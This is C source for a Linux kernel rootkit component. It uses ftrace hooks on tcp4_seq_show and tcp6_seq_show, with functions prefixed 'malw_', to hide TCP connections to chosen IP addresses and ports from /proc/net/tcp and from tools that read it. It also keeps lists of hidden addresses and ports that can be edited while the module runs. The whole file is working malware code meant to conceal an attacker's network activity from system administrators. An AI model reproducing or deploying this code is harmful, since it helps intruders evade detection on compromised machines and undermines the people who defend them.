#include "tcp_seq_show.h"
#include "ftrace_helper.h"

int tcp_port_size = 0;
int tcp_ip_size = 0;

int *hidden_tcp_ports;
int *hidden_tcp_ips;

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);

struct ftrace_hook hook_tcp4_seq_show = HOOK("tcp4_seq_show", malw_tcp4_seq_show, &orig_tcp4_seq_show);
struct ftrace_hook hook_tcp6_seq_show = HOOK("tcp6_seq_show", malw_tcp6_seq_show, &orig_tcp6_seq_show);

void add_hidden_tcp_ip(char *str)
{
    int a, b, c, d;
    char arr[4];
    tcp_ip_size++;
    hidden_tcp_ips = krealloc(hidden_tcp_ips, tcp_ip_size*sizeof(int), GFP_KERNEL);

    sscanf(str, "%d.%d.%d.%d", &a, &b, &c, &d);
    arr[0] = a; arr[1] = b; arr[2] = c; arr[3] = d;

    *(hidden_tcp_ips + tcp_ip_size - 1) = *(unsigned int *)arr;
}

void remove_hidden_tcp_ip(char *str)
{
    int a, b, c, d;
    int i;
    int ip;
    char arr[4];
    int move = 0;

    sscanf(str, "%d.%d.%d.%d", &a, &b, &c, &d);
    arr[0] = a; arr[1] = b; arr[2] = c; arr[3] = d;

    ip = *(unsigned int *)arr;

    for (i = 0; i < tcp_ip_size; i++) {
        if (*(hidden_tcp_ips + i) == ip) {
            move = 1;
            continue;
        }
        if (move) {
            *(hidden_tcp_ips + i - 1) = *(hidden_tcp_ips + i);
        }
    }
    if (tcp_ip_size > 0 && move) {
        tcp_ip_size--;
        hidden_tcp_ips = krealloc(hidden_tcp_ips, tcp_ip_size*sizeof(int), GFP_KERNEL);
    }
}

void add_hidden_tcp_port(int port)
{
    tcp_port_size++;
    hidden_tcp_ports = krealloc(hidden_tcp_ports, tcp_port_size*sizeof(int), GFP_KERNEL);
    *(hidden_tcp_ports + tcp_port_size - 1) = port;
}

void remove_hidden_tcp_port(int port)
{
    int i;
    int move = 0;
    for (i = 0; i < tcp_port_size; i++) {
        if (*(hidden_tcp_ports + i) == port) {
            move = 1;
            continue;
        }
        if (move) {
            *(hidden_tcp_ports + i - 1) = *(hidden_tcp_ports + i);
        }
    }
    if (tcp_port_size > 0 && move) {
        tcp_port_size--;
        hidden_tcp_ports = krealloc(hidden_tcp_ports, tcp_port_size*sizeof(int), GFP_KERNEL);
    }
}

void install_tcp_seq_show_hook(void)
{
    fh_install_hook(&hook_tcp4_seq_show);
    fh_install_hook(&hook_tcp6_seq_show);
}

void remove_tcp_seq_show_hook(void)
{
    fh_remove_hook(&hook_tcp4_seq_show);
    fh_remove_hook(&hook_tcp6_seq_show);
    kfree(hidden_tcp_ports);
}

asmlinkage long malw_tcp4_seq_show(struct seq_file *seq, void *v)
{
    int i;
    long ret;
    struct sock *sk = v;

    for (i = 0; i < tcp_ip_size; i++) {
        if (sk != (struct sock *)0x1 && sk->sk_rcv_saddr && sk->sk_daddr) {
            if (sk->sk_rcv_saddr == *(hidden_tcp_ips + i) || sk->sk_daddr == *(hidden_tcp_ips + i)) {
                return 0;
            }
        }
    }


    for (i = 0; i < tcp_port_size; i++) {
        if (sk != (struct sock *)0x1 && (sk->sk_num == *(hidden_tcp_ports + i) || be16_to_cpu(sk->sk_dport) == *(hidden_tcp_ports + i))) {
            return 0;
        }
    }

    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}

asmlinkage long malw_tcp6_seq_show(struct seq_file *seq, void *v)
{
    int i;
    long ret;
    struct sock *sk = v;

    for (i = 0; i < tcp_port_size; i++) {
        if (sk != (struct sock *)0x1 && (sk->sk_num == *(hidden_tcp_ports + i) || be16_to_cpu(sk->sk_dport) == *(hidden_tcp_ports + i))) {
            return 0;
        }
    }

    ret = orig_tcp6_seq_show(seq, v);
    return ret;
}
